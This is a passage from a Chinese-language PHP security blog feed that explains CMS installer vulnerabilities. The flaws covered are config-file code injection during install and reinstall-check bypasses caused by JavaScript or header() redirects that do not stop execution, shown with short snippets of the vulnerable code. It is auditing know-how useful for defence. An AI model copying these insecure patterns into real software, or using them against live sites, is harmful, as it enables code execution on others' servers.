title="install系统重装漏洞"></a>install系统重装漏洞</h4><p>在安装过程中，</p><p>需要填写Web应用的数据库配置，一般会将配置直接写入到配置文件中，</p><p>在写入的过程中往往没有校验</p><p>(有可能其他安装后修改的功能会做校验)，导致</p><p>直接写入php代码到配置文件中，</p><p>从而达到任意代码执行的目的</p><p>install系统重装验证绕过漏洞</p><p>某些CMS的install的验证不严谨，导致直接绕过重装，例如</p><p>1.</p><p>使用JavaScript跳转，但是后面的代码仍然会被执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this\-&gt;myclass-\&gt;notice(&#39;alert(&quot;系统已安装过&quot;);window.location.href&#x3D;&quot;&#39;.site_url().&#39;&quot;;&#39;);</span><br></pre></td></tr></table></figure><p>2.</p><p>使用header()</p><p>函数进行跳转，没有使用die()</p><p>或者exit()结束，那么后面部分的代码仍然会</p><p>被执行</p><p>//header 头并不会结束之后的代码，漏洞出在这里</p><p>header( ‘location: ../index.php’);</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;文件上传漏洞挖掘与利用&quot;&gt;&lt;a href=&quot;#文件上传漏洞挖掘与利用&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞挖掘与利用&quot;&gt;&lt;/a&gt;文件上传漏洞挖掘与利用&lt;/h4&gt;&lt;p&gt;1.搜索 move_uploaded_file()函数, 在PHP中</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
</feed>
